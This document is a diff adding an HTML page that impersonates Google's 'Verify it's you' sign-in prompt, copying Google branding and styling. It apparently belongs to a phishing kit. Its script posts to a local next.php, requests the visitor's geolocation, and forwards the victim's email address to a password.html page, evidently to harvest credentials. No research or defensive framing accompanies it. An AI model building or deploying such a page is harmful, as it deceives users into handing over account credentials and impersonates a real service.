@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - Google Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Gmail brand colors */
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-yellow: #fbbc04;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-light-gray: #f1f3f4;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            overflow-x: hidden !important;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+            background: var(--gmail-light-gray) !important;
+            color: #202124 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+        }
+
+        .gmail-container {
+            background: var(--gmail-white) !important;
+            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15) !important;
+            border-radius: 8px !important;
+            margin: 24px auto 0 !important;
+            padding: 48px 40px 36px !important;
+            width: 100% !important;
+            max-width: 450px !important;
+            min-height: 400px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            box-sizing: border-box !important;
+        }
+
+        .gmail-form {
+            width: 100% !important;
+            max-width: 360px !important;
+            margin: 0 auto !important;
+        }
+
+        .gmail-logo {
+            width: 75px !important;
+            height: 24px !important;
+            margin: 0 auto 16px !important;
+            display: block !important;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIyLjc1IDEySDE5djYuNDhoMy43NVoiIGZpbGw9IiMxQTczRTgiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8cGF0aCBkPSJNMjIuNzUgMTEuNGgxOC41YzEuMDUgMCAxLjkyLjg3IDEuOTIgMS45MnYxOC41YzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNGQkJDMDQiLz4KPHBhdGggZD0iTTIyLjc1IDExLjRoMTguNWMxLjA1IDAgMS45Mi44NzEgMS45MiAxLjkyVjMwYzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNFQTQzMzUiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8L3N2Zz4K') no-repeat center center !important;
+            background-size: contain !important;
+        }
+
+        .verify-title {
+            font-size: 24px !important;
+            font-weight: 400 !important;
+            font-family: 'Roboto', sans-serif !important;
+            color: #202124 !important;
+            margin: 0 0 8px 0 !important;
+            text-align: center !important;
+        }
+
+        .verify-subtitle {
+            font-size: 16px !important;
+            color: #5f6368 !important;
+            margin: 0 0 24px 0 !important;
+            text-align: center !important;
+        }
+
+        .device-info {
+            background: #f8f9fa !important;
+            border: 1px solid var(--gmail-border) !important;
+            border-radius: 8px !important;
+            padding: 16px !important;
+            margin: 24px 0 !important;
+            text-align: center !important;
+        }
+
+        .device-icon {
+            font-size: 32px !important;
+            margin-bottom: 8px !important;
+        }
+
+        .device-name {
+            font-weight: 500 !important;
+            color: #202124 !important;
+            margin-bottom: 4px !important;
+        }
+
+        .device-location {
+            font-size: 14px !important;
+            color: #5f6368 !important;
+        }
+
+        .verify-question {
+            font-size: 16px !important;
+            color: #202124 !important;
+            margin: 24px 0 16px 0 !important;
+            text-align: center !important;
+            font-weight: 400 !important;
+        }
+
+        .button-group {
+            display: flex !important;
+            gap: 12px !important;
+            margin-top: 24px !important;
+        }
+
+        .verify-btn {
+            flex: 1 !important;
+            padding: 12px 24px !important;
+            border: 1px solid var(--gmail-border) !important;
+            border-radius: 4px !important;
+            background: var(--gmail-white) !important;
+            color: var(--gmail-blue) !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            cursor: pointer !important;
+            text-align: center !important;
+            text-decoration: none !important;
+            display: inline-block !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .verify-btn:hover {
+            background: #f8f9fa !important;
+        }
+
+        .verify-btn.yes {
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            border-color: var(--gmail-blue) !important;
+        }
+
+        .verify-btn.yes:hover {
+            background: #1557b0 !important;
+        }
+
+        .help-link {
+            display: block !important;
+            text-align: center !important;
+            margin-top: 24px !important;
+            color: var(--gmail-blue) !important;
+            text-decoration: none !important;
+            font-size: 14px !important;
+        }
+
+        .help-link:hover {
+            text-decoration: underline !important;
+        }
+
+        @media (max-width: 480px) {
+            .button-group {
+                flex-direction: column !important;
+            }
+
+            .verify-btn {
+                margin-bottom: 8px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="gmail-container">
+        <div class="gmail-form">
+            <div class="gmail-logo"></div>
+            <h1 class="verify-title">Verify it's you</h1>
+            <div class="verify-subtitle">To help keep your account secure, Google wants to make sure it's really you trying to sign in</div>
+
+            <div class="device-info">
+                <div class="device-icon">📱</div>
+                <div class="device-name" id="device-name">Your phone</div>
+                <div class="device-location" id="device-location">Location unknown</div>
+            </div>
+
+            <div class="verify-question">Is this you trying to sign in?</div>
+
+            <div class="button-group">
+                <button class="verify-btn yes" onclick="verifyYes()">Yes</button>
+                <button class="verify-btn" onclick="verifyNo()">No</button>
+            </div>
+
+            <a href="#" class="help-link" onclick="needHelp()">More options</a>
+        </div>
+    </div>
+
+    <script>
+        // Get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Set device info based on user agent
+        function setDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceName = 'Your device';
+            let location = 'Location unknown';
+
+            if (userAgent.includes('Mobile')) {
+                deviceName = 'Your phone';
+            } else if (userAgent.includes('Tablet')) {
+                deviceName = 'Your tablet';
+            } else {
+                deviceName = 'Your computer';
+            }
+
+            // Get location info if available
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    document.getElementById('device-location').textContent =
+                        'Near ' + position.coords.latitude.toFixed(2) + ', ' + position.coords.longitude.toFixed(2);
+                });
+            }
+
+            document.getElementById('device-name').textContent = deviceName;
+        }
+
+        function verifyYes() {
+            // Send verification confirmation
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('device_verify=yes');
+
+            // Redirect to next step (could be password page or success)
+            const email = getUrlParameter('email');
+            if (email) {
+                window.location.href = 'password.html?email=' + encodeURIComponent(email) + '&device_verified=yes';
+            } else {
+                window.location.href = 'password.html?device_verified=yes';
+            }
+        }
+
+        function verifyNo() {
+            // Show additional verification options or redirect to help
+            alert("If this isn't you, please contact Google support immediately.");
+            // Could redirect to a different verification method
+        }
+
+        function needHelp() {
+            alert("Choose a different verification method.");
+            // Could show options for SMS, authenticator app, etc.
+        }
+
+        // Initialize device info on page load
+        document.addEventListener('DOMContentLoaded', setDeviceInfo);
+    </script>
+</body>
+</html>
